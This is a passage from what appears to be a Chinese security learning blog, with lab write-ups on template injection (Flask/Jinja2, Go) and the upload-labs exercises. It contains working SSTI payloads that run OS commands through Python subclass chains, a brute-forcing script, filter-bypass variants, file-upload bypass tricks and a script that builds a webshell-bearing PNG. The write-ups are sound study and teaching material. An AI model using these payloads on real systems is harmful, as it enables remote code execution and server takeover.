id="Jinja2-Template-format"><a href="#Jinja2-Template-format" class="headerlink" title="Jinja2 - Template format"></a>Jinja2 - Template format</h3><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">extends</span></span> &quot;layout.html&quot; %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">block</span></span> body %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> user <span class="hljs-keyword">in</span> users %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; user.url &#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; user.username &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endblock</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><h2 id="xss相关"><a href="#xss相关" class="headerlink" title="xss相关"></a>xss相关</h2><p>Go语言允许定义一整个模板且之后使用，可能让payload变成这样：<code>&#123;&#123;define "T1"&#125;&#125;&lt;script&gt;alert(1)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template "T1"&#125;&#125;</code></p><h2 id="RCE相关"><a href="#RCE相关" class="headerlink" title="RCE相关"></a>RCE相关</h2><p>在Go语言中可以以类似<code>&#123;&#123; .System "ls" &#125;&#125;</code>使用命令<br>需要源代码类似：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake">func (p Person) Secret (<span class="hljs-keyword">test</span> <span class="hljs-keyword">string</span>) <span class="hljs-keyword">string</span> &#123;<br>out, _ := exec.<span class="hljs-keyword">Command</span>(<span class="hljs-keyword">test</span>).CombinedOutput()<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">string</span>(out)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ssti-lab-flask-构造payload相关"><a href="#ssti-lab-flask-构造payload相关" class="headerlink" title="ssti-lab(flask)构造payload相关"></a>ssti-lab(flask)构造payload相关</h2><h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><p><code>__class__</code><br>用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 是类的一个内置属性，表示类的类型； 也是类的实例的属性，表示实例对象的类。<br>例：<code>[].__class__</code></p><p><code>__bases__</code><br>用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组。<br>例：<code>[].__class__.__bases__</code></p><p><code>__mro__</code><br>获取基类，包含了当前类对象所有继承的基类<br>例：<br><code>&#39;&#39;.__class__.__mro__</code><br><code>&#39;&#39;.__class__.__mro__[-1]</code></p><p><code>__subclasses__()</code><br>获取当前类的所有子类，即Object的子类。通过拿到Object的子类，使用其中的一些函数，进行文件读取或者命令执行。<br>例：<code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()</code></p><p><code>__init__</code><br>重载子类，获取子类初始化的属性</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>例：<code>os._wrap_close.__init__.__globals__</code>   可以获取到os中的一些函数，进行文件读取。</p><p><code>lipsum</code><br>可以用于获得<code>__builtins__</code>，<code>lipsum.__globals__</code>有os模块<br><code>&#123;&#123;(lipsum|string|list)&#125;&#125;</code>能获得字符位置</p><h3 id="解题示例"><a href="#解题示例" class="headerlink" title="解题示例"></a>解题示例</h3><h4 id="一句话形式"><a href="#一句话形式" class="headerlink" title="一句话形式"></a>一句话形式</h4><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml">//依不同题目替换此行</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:5000/level/1&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&#x27;]&#125;&#125;&#x27;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url,data=data)<br>        <span class="hljs-comment">#print(data)</span><br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;-----&gt;&quot;</span>,response.text)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> :<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>构造出来的payload示例：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[147].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;type flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/03：upload-lab记录</title>
    <link href="/2023/08/03/upload-lab/"/>
    <url>/2023/08/03/upload-lab/</url>
    
    <content type="html"><![CDATA[<h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass 1"></a>Pass 1</h2><p>F12查看前端，可知仅为前端过滤，浏览器禁用脚本即可</p><h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass 2"></a>Pass 2</h2><p>MIME检测<br>抓包更改type字段即可</p><h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass 3"></a>Pass 3</h2><p>后缀名检测<br>更改文件后缀即可，如把php改为php5</p><h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass 4"></a>Pass 4</h2><p>黑名单绕过<br>.htaccess文件绕过<br>生成文件.htaccess写入<code>SetHandler application/x-httpd-php</code><br>将该文件上传至服务器<br>修改一句话木马为图片后缀</p><h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass 5"></a>Pass 5</h2><p>黑名单绕过<br>过滤为删除文件名末尾的点，可以将后缀设置为<code>.PHP</code></p><h2 id="Pass-6"><a href="#Pass-6" class="headerlink" title="Pass 6"></a>Pass 6</h2><p>黑名单空格绕过<br><code>1.php </code></p><h2 id="Pass-7"><a href="#Pass-7" class="headerlink" title="Pass 7"></a>Pass 7</h2><p>黑名单点绕过<br>可该为<code>1.php.</code></p><h2 id="Pass-8"><a href="#Pass-8" class="headerlink" title="Pass 8"></a>Pass 8</h2><p>黑名单<code>::$DATA</code><br><code>1.php.</code>或<code>1.php::$DATA</code></p><h2 id="Pass-9"><a href="#Pass-9" class="headerlink" title="Pass 9"></a>Pass 9</h2><p>黑名单绕过<br><code>1.php::$DATA</code></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass 10"></a>Pass 10</h2><p>双写绕过<br><code>1.pphphp</code></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass 11"></a>Pass 11</h2><p>白名单<br>查看源码，发现文件路径可控<br><code>save_path=../upload/1.php%00</code><br><code>filename=&quot;1.png&quot;</code></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass 12"></a>Pass 12</h2><p>与上题类似，但这次改为POST传递save-path</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass 13"></a>Pass 13</h2><p>该题需要生成图片马<br>源代码会检查文件头两个字节<br>可在cmd中执行<code>copy shelltry.jpg /b + webshell.php /a test.jpg</code>并将其上传，后点击“文件包含漏洞”链接进入利用文件包含漏洞读取文件</p><h2 id="Pass-14-amp-15"><a href="#Pass-14-amp-15" class="headerlink" title="Pass 14 &amp; 15"></a>Pass 14 &amp; 15</h2><p>在上一题的图片马加上文件头（如gif文件需在文件内加<code>GIF89a</code>字段），也可直接上传php后拦截修改</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass 16"></a>Pass 16</h2><p>二次渲染绕过<br>来源：<a href="https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142%5Ev92%5EchatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142^v92^chatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187</a><br>GIF:<br>首先将GIF文件与php一句话木马合并，再将上传后的文件下载与合并后的文件对比（如010_Editor），在未被渲染的部分写一句话木马<br>PNG:<br>需要脚本构造图片</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">&lt;?php<br>$p = array(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>)<span class="hljs-comment">;</span><br> <br> <br> <br>$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>)<span class="hljs-comment">;</span><br> <br>for ($y = <span class="hljs-number">0</span><span class="hljs-comment">; $y &lt; sizeof($p); $y += 3) &#123;</span><br>   $r = $p[$y]<span class="hljs-comment">;</span><br>   $g = $p[$y+<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>   $b = $p[$y+<span class="hljs-number">2</span>]<span class="hljs-comment">;</span><br>   $color = imagecolorallocate($img, $r, $g, $b)<span class="hljs-comment">;</span><br>   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color)<span class="hljs-comment">;</span><br>&#125;<br> <br>imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>)<span class="hljs-comment">;</span><br>?&gt;<br></code></pre></td></tr></table></figure><p>1.准备png图片<br>2.在cmd使用php命令执行该脚本生成新png图片<br>3.使用新图片上传<br>4.在文件包含漏洞处进行传参</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass 17"></a>Pass 17</h2><p>这关存在逻辑漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在对输入进行验证之前已经将文件移入上传文件夹，可以采用条件竞争<br>用burp拦截数据包发送到测试器模块，在另一个浏览器不断在上传文件的url刷新直到访问成功即可</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass 18"></a>Pass 18</h2><p>审计代码，该代码会先进行文件类型匹配，通过后移动到upload同级目录，再对文件重命名；而在能通过白名单的后缀中，<code>.7z</code>不会被浏览器解析，利用浏览器遇到不能解析的后缀向前解析的特性考虑构造<code>1.php.7z</code>，使用Pass 17的方式尝试上传访问该文件</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass 19"></a>Pass 19</h2><p>定义了黑名单但没有小写转换，仅对保存文件名黑名单处理<br>可以直接大写绕过<code>1.PHP</code></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass 20"></a>Pass 20</h2><p>首先会进行MIME检查，之后会对save_name最后一项进行检查<br>因此，抓包后设置<code>save_name[0]</code>与<code>save_name[2]</code>，前者将文件类型设置为php，后者设置为与MIME对应的文件类型</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/7/28：sstilab记录</title>
    <link href="/2023/07/28/sstilab/"/>
    <url>/2023/07/28/sstilab/</url>
    
    <content type="html"><![CDATA[<p>Flask<br>来源：<a href="https://xz.aliyun.com/t/12181#toc-8">https://xz.aliyun.com/t/12181#toc-8</a></p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><p><code>__class__</code><br>用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 是类的一个内置属性，表示类的类型； 也是类的实例的属性，表示实例对象的类。<br>例：<code>[].__class__</code></p><p><code>__bases__</code><br>用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组。<br>例：<code>[].__class__.__bases__</code></p><p><code>__mro__</code><br>获取基类，包含了当前类对象所有继承的基类<br>例：<br><code>&#39;&#39;.__class__.__mro__</code><br><code>&#39;&#39;.__class__.__mro__[-1]</code></p><p><code>__subclasses__()</code><br>获取当前类的所有子类，即Object的子类。通过拿到Object的子类，使用其中的一些函数，进行文件读取或者命令执行。<br>例：<code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()</code></p><p><code>__init__</code><br>重载子类，获取子类初始化的属性</p><p><code>__globals__</code><br>函数会以字典的形式返回当前位置的全部全局变量<br>例：<code>os._wrap_close.__init__.__globals__</code>   可以获取到os中的一些函数，进行文件读取。</p><p><code>lipsum</code><br>可以用于获得<code>__builtins__</code>，<code>lipsum.__globals__</code>有os模块<br><code>&#123;&#123;(lipsum|string|list)&#125;&#125;</code>能获得字符位置</p><h3 id="解题示例"><a href="#解题示例" class="headerlink" title="解题示例"></a>解题示例</h3><p><del>因某种原因构造出来的payload无法直接使用，需要逐个输入魔法方法</del><br>直接从github下载的sstilab会出现flask和jinja2的兼容版本问题，在windows上直接使用作者留下的安装方式不会出现报错，但在ubuntu上会提示无法导入escape模块</p><h4 id="1：一句话"><a href="#1：一句话" class="headerlink" title="1：一句话"></a>1：一句话</h4><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml">//依不同题目替换此行</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2：脚本"><a href="#2：脚本" class="headerlink" title="2：脚本"></a>2：脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:5000/level/1&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&#x27;]&#125;&#125;&#x27;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url,data=data)<br>        <span class="hljs-comment">#print(data)</span><br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;-----&gt;&quot;</span>,response.text)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> :<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>构造出来的payload示例：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[147].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;type flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>如以上解题示例2所示，先输入</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()<br></code></pre></td></tr></table></figure><p>获得当前所有子类列表，使用脚本选择os._wrap_close，为147，选择函数popen执行查看文件命令，最后使用read()读取</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>输入检测得知<code>&#123;&#123;`被WAF防御，需要进行替代可使`&#123;&#123;%print(...)%&#125;&#125;</code>方式代替<code>&#123;&#123;&#125;&#125;`，余下步骤相同## level 3（做不出来）仅会显示输入的语句是否正确查看下wp需要使用dnslog外带，也可使用nc命令将文件回显到自己服务器上但似乎跟前面一样，若构造完整的payload直接输入无法的到结果，之前可能显示“no this level”或者“Hello  ”## level 4过滤了`[]`<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__getitem</span>()__返回所给的键对应的值，代替索引的<span class="hljs-selector-attr">[]</span><br>__getattribute__获取对象属性或方法，代替魔术方法的<span class="hljs-selector-attr">[]</span><br></code></pre></td></tr></table></figure>payload:<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">147</span>).__init__.__globals__.__getitem(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;type flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>## level 5过滤“\”“' "”<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">request.<span class="hljs-built_in">args</span>:Flask框架中的特殊参数，接受URL地址中的变量数据，此处我们就可以通过构造带参数的url,配合request.<span class="hljs-built_in">args</span>获取构造参数的内容来绕过限制<br></code></pre></td></tr></table></figure>paylaod:<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">POST:</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[147].__init__.__globals__[request.args.a](<span class="hljs-name">request.args.b</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">GET:a=popen&amp;b=type flag</span><br></code></pre></td></tr></table></figure>## level 6过滤“_”需对“_”进行十六进制编码（\x5f）后结合过滤器连接绕过过滤器：过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数；可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span>获取一个序列或者字典的长度并将其返回<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">()</span></span>将值转换为int类型；<br><span class="hljs-function"><span class="hljs-title">float</span><span class="hljs-params">()</span></span>将值转换为<span class="hljs-attribute">float</span>类型；<br><span class="hljs-function"><span class="hljs-title">lower</span><span class="hljs-params">()</span></span>将字符串转换为小写；<br><span class="hljs-function"><span class="hljs-title">upper</span><span class="hljs-params">()</span></span>将字符串转换为大写；<br><span class="hljs-function"><span class="hljs-title">reverse</span><span class="hljs-params">()</span></span>反转字符串；<br><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(value,old,new)</span></span>将value中的old替换为new<br><span class="hljs-function"><span class="hljs-title">list</span><span class="hljs-params">()</span></span>将变量转换为列表类型；<br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">()</span></span>将变量转换成字符串类型；<br><span class="hljs-function"><span class="hljs-title">join</span><span class="hljs-params">()</span></span>将一个序列中的参数值拼接成字符串，通常有python内置的<span class="hljs-built_in">dict</span>()配合使用；<br><span class="hljs-function"><span class="hljs-title">attr</span><span class="hljs-params">()</span></span>获取对象的属性；<br></code></pre></td></tr></table></figure>payload:<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>)|attr(<span 